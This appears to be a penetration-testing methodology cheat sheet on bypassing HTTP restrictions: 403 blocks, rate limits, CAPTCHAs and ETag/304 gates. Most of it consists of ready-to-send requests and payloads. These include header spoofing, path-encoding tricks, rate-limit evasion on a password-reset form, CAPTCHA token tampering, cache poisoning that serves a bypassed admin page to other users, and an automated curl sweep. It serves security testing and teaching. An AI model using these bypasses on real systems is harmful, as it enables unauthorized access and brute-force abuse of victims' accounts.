# 🚧 Restriction Bypass Methodology

> **A complete, structured approach to bypassing HTTP-level restrictions — 403 blocks, rate limits, CAPTCHAs, and caching controls.**

---

<div align="center">

![Type](https://img.shields.io/badge/Vulnerability-Access%20Control%20Bypass-red?style=for-the-badge)
![Scope](https://img.shields.io/badge/Scope-403%20%7C%20Rate%20Limit%20%7C%20CAPTCHA%20%7C%20304-orange?style=for-the-badge)
![Approach](https://img.shields.io/badge/Approach-Manual%20%2B%20Burp-blue?style=for-the-badge)

</div>

---

## 📋 Table of Contents

1. [Introduction](#-introduction)
2. [Phase 1 — 403 Forbidden Bypass](#-phase-1--403-forbidden-bypass)
3. [Phase 2 — Rate Limit Bypass](#-phase-2--rate-limit-bypass)
4. [Phase 3 — CAPTCHA Bypass](#-phase-3--captcha-bypass)
5. [Phase 4 — 304 Not Modified / ETag Bypass](#-phase-4--304-not-modified--etag-bypass)
6. [Phase 5 — Automated Sweeping](#-phase-5--automated-sweeping)
7. [Summary Workflow](#️-summary-workflow)
8. [Quick Decision Tree](#-quick-decision-tree)

---

## 📖 Introduction

Web applications enforce restrictions at several independent layers — path-based access control (403), request-frequency throttling (rate limiting), human-verification (CAPTCHA), and caching/conditional-request logic (304/ETag). Each layer is often implemented inconsistently between a front-end proxy/CDN and the back-end application, and that inconsistency is exactly what every technique below exploits.

---

## 🔒 Phase 1 — 403 Forbidden Bypass

🛠️ Tool: [Bypass-403](https://github.com/daffainfo/bypass-403) — automates most of the below against a single blocked path.

### X-Original-URL / X-Rewrite-URL Header

Some reverse proxies route on the literal path but pass the "real" target to the backend via a header — if the backend trusts it blindly:

```
GET /admin HTTP/1.1
Host: target.com
```
Bypass:
```
GET /anything HTTP/1.1
Host: target.com
X-Original-URL: /admin
```

Also try:
```
X-Rewrite-URL: /admin
```

### Path Encoding Tricks

```
http://target.com/admin        → 403
http://target.com/%2e/admin    → try
```

### Dot / Slash / Semicolon Injection

```
http://target.com/admin        → 403
```
```
http://target.com/secret/.
http://target.com//secret//
http://target.com/./secret/..
http://target.com/;/secret
http://target.com/.;/secret
http://target.com//;//secret
```

### Path Parameter Injection (`..;/`)

Exploits legacy servlet containers (older Tomcat) that treat `;` as a path-parameter separator, confusing the access-control check while still routing correctly:

```
http://target.com/admin
```
```
http://target.com/admin..;/
```

### Case Manipulation

```
http://target.com/admin
```
```
http://target.com/aDmIN
```

### Via Web Cache Poisoning

Combine the header trick with a cacheable request so the bypassed response gets cached and served to OTHER users too:

```
GET /anything HTTP/1.1
Host: victim.com
X-Original-URL: /admin
```

### Additional Headers Worth Trying

```
X-Custom-IP-Authorization: 127.0.0.1
X-Forwarded-For: 127.0.0.1
X-Forward-For: 127.0.0.1
X-Remote-IP: 127.0.0.1
X-Client-IP: 127.0.0.1
X-Host: 127.0.0.1
X-Forwarded: 127.0.0.1
Forwarded-For: 127.0.0.1
True-Client-IP: 127.0.0.1
```

### Method Switching

```
GET /admin      → 403
HEAD /admin     → try
POST /admin     → try
```

> 📚 Reference: [@iam_j0ker's 403 bypass cheatsheet](https://twitter.com/iam_j0ker) · [HackTricks](https://book.hacktricks.xyz/pentesting/pentesting-web)

---

## 🔓 Phase 2 — Rate Limit Bypass

### IP Spoofing via Headers

```
X-Forwarded-For: 127.0.0.1
X-Forwarded-Host: 127.0.0.1
X-Client-IP: 127.0.0.1
X-Remote-IP: 127.0.0.1
X-Remote-Addr: 127.0.0.1
X-Host: 127.0.0.1
```

Example:

```
POST /ForgotPass.php HTTP/1.1
Host: target.com
X-Forwarded-For: 127.0.0.1

email=victim@gmail.com
```

> Automate this by rotating the LAST octet of the spoofed IP across requests in Burp Intruder — some rate limiters key strictly on the exact string value.

### Null Byte / CRLF at End of Value

```
POST /ForgotPass.php HTTP/1.1
Host: target.com

email=victim@gmail.com%00
```

Also try:
```
email=victim@gmail.com%09
email=victim@gmail.com%0d
email=victim@gmail.com%0a
```

### Rotate User-Agent / Cookie / Session

```
POST /ForgotPass.php HTTP/1.1
Host: target.com
Cookie: xxxxxxxxxx

email=victim@gmail.com
```
Bypass:
```
POST /ForgotPass.php HTTP/1.1
Host: target.com
Cookie: aaaaaaaaaaaaa

email=victim@gmail.com
```

> If rate limiting is keyed to session/cookie rather than IP, simply requesting a fresh session per attempt (or omitting the cookie entirely) can reset the counter.

### Random/Junk Query Parameter

Some rate limiters key on the exact URL string, including the query string:

```
POST /ForgotPass.php HTTP/1.1
Host: target.com

email=victim@gmail.com
```
Bypass:
```
POST /ForgotPass.php?random=1 HTTP/1.1
Host: target.com

email=victim@gmail.com
```

> Rotate the random value per request (`?a=1`, `?a=2`, ...) if a single static param doesn't work.

### Trailing Whitespace in Parameter Value

```
{"email":"victim@gmail.com"}
```
Bypass:
```
{"email":"victim@gmail.com "}
```

### Case Variation on the Value Itself

```
email=victim@gmail.com
email=VICTIM@gmail.com
email=Victim@Gmail.com
```

### Alternate/Legacy Endpoint

```
Try the same action via a different route that may not share the
same rate-limit rule: mobile API, legacy API version, GraphQL
mutation equivalent, or a slightly different path
  (/api/v1/reset vs /api/reset vs /mobile/reset)
```

---

## 🤖 Phase 3 — CAPTCHA Bypass

### HTTP Method Switching

```
POST / HTTP/1.1
Host: target.com

_RequestVerificationToken=xxxxxxxxxxxxxx&_Username=daffa&_Password=test123
```
Bypass:
```
GET /?_RequestVerificationToken=xxxxxxxxxxxxxx&_Username=daffa&_Password=test123 HTTP/1.1
Host: target.com
```

### Empty CAPTCHA Value

```
_RequestVerificationToken=&_Username=daffa&_Password=test123
```

### Reuse an Old/Already-Solved Token

```
_RequestVerificationToken=OLD_CAPTCHA_TOKEN&_Username=daffa&_Password=test123
```

### Content-Type / Body Format Conversion

```
{"_RequestVerificationToken":"xxxxxxxxxxxxxx","_Username":"daffa","_Password":"test123"}
```
Convert to form-encoded:
```
_RequestVerificationToken=xxxxxxxxxxxxxx&_Username=daffa&_Password=test123
```

> The reverse (form → JSON, or → XML) is equally worth trying — CAPTCHA validation middleware sometimes only hooks one content-type parser.

### IP Spoofing Headers

```
X-Originating-IP: 127.0.0.1
X-Forwarded-For: 127.0.0.1
X-Remote-IP: 127.0.0.1
X-Remote-Addr: 127.0.0.1
```

### Partial Token Tampering

Flip a few characters of the token value and see if validation is looser than expected (e.g. only checks length/format, not the actual value):

```
_RequestVerificationToken=xxxxxxxxxxxxxx
```
```
_RequestVerificationToken=xxxdxxxaxxcxxx
```

### Remove the Parameter Entirely

```
Sometimes an empty value still gets rejected but the field being
ABSENT altogether skips the check path entirely — worth testing
both cases separately.
```

### Client-Side-Only Validation

```
If the CAPTCHA widget only disables the submit button via JS and
the server never actually verifies the solve token, intercepting
and replaying the raw request (without ever solving the CAPTCHA in
the browser) will succeed outright.
```

---

## 🗄️ Phase 4 — 304 Not Modified / ETag Bypass

Useful when a resource behind a conditional-request check (`If-None-Match`/`If-Modified-Since`) is being used as an access-control gate rather than pure caching.

### Remove the Conditional Header

```
GET /admin HTTP/1.1
Host: target.com
If-None-Match: W/"32-IuK7rSIJ92ka0c92kld"
```
Bypass:
```
GET /admin HTTP/1.1
Host: target.com
```

### Tamper the ETag Value

Append a stray character so it no longer matches the cached/expected value, forcing a fresh evaluation path:

```
GET /admin HTTP/1.1
Host: target.com
If-None-Match: W/"32-IuK7rSIJ92ka0c92kld" b
```

### Tamper If-Modified-Since

```
GET /admin HTTP/1.1
Host: target.com
If-Modified-Since: Thu, 01 Jan 1970 00:00:00 GMT
```

> 📚 Reference: [Bypass ETag/If-None-Match — anggigunawan17](https://anggigunawan17.medium.com/tips-bypass-etag-if-none-match-e1f0e650a521)

---

## 🤖 Phase 5 — Automated Sweeping

```bash
# Bypass-403 — sweeps the full header/path-trick matrix automatically
git clone https://github.com/daffainfo/bypass-403.git
cd bypass-403
go run bypass-403.go -u https://target.com/admin

# Quick manual header sweep with curl for 403/rate-limit/CAPTCHA headers
for header in "X-Forwarded-For" "X-Originating-IP" "X-Remote-IP" "X-Client-IP" "X-Host" "X-Original-URL"; do
  echo "[*] $header"
  curl -s -o /dev/null -w "%{http_code}\n" -H "$header: 127.0.0.1" https://target.com/admin
done

# Burp Intruder sortlist for path-based 403 bypasses (cluster bomb on path suffix)
# payload set: ., /, ..;/, %2e, //, ;, %20
```

---

## ⚔️ Summary Workflow

```
┌──────────────────────────────────────────────────────┐
│              RESTRICTION BYPASS WORKFLOW               │
├──────────────────────────────────────────────────────┤
│                                                        │
│  1. 🔒 Hit a 403? → header tricks → path tricks →     │
│         case tricks → method switch                   │
│            ↓                                          │
│  2. 🔓 Hit a rate limit? → IP spoof headers →          │
│         null byte/CRLF → rotate cookie/UA →            │
│         junk param → alternate endpoint                │
│            ↓                                          │
│  3. 🤖 Hit a CAPTCHA? → method switch → empty/reused   │
│         token → content-type swap → IP spoof headers   │
│            ↓                                          │
│  4. 🗄️ Hit a 304/cache gate? → strip conditional       │
│         header → tamper ETag/If-Modified-Since         │
│            ↓                                          │
│  5. 🤖 Automate the Sweep (Bypass-403, curl loop)      │
│            ↓                                          │
│  6. 📝 Document & Report                              │
│                                                        │
└──────────────────────────────────────────────────────┘
```

---

## 🧠 Quick Decision Tree

```
What's blocking you?
    │
    ├── 403 Forbidden on a specific path
    │     → X-Original-URL header first (highest hit rate)
    │     → then path tricks (..;/  %2e  //  ;)
    │     → then case variation
    │     → then method switch (HEAD/POST instead of GET)
    │
    ├── 429 / silently throttled after N requests
    │     → IP spoof headers first (X-Forwarded-For rotation)
    │     → then null byte/CRLF on the value
    │     → then rotate cookie/session
    │     → then junk query param
    │     → then try an alternate/legacy endpoint entirely
    │
    ├── CAPTCHA required to submit
    │     → check if it's client-side-only first (just replay raw)
    │     → method switch (GET instead of POST)
    │     → empty or reused token value
    │     → content-type conversion (JSON ↔ form)
    │
    └── 304 Not Modified where you expect fresh content/access
          → strip If-None-Match / If-Modified-Since entirely
          → tamper the ETag value with a trailing character
```

---

### 📚 Resources

- 🔗 [daffainfo/bypass-403](https://github.com/daffainfo/bypass-403)
- 🔗 [@iam_j0ker — 403 Bypass Cheatsheet](https://twitter.com/iam_j0ker)
- 🔗 [HackTricks — Web Pentesting](https://book.hacktricks.xyz/pentesting/pentesting-web)
- 🔗 [Bypass ETag/If-None-Match — anggigunawan17](https://anggigunawan17.medium.com/tips-bypass-etag-if-none-match-e1f0e650a521)
- Companion docs: `API-Testing-Methodology.md`, `Host-Header-Injection.md`, `Password-Reset-Testing.md`

---

<div align="center">

### 🔥 Every gate has a header it forgot to check.

---

*Happy Hacking — responsibly and ethically* 🛡️

</div>
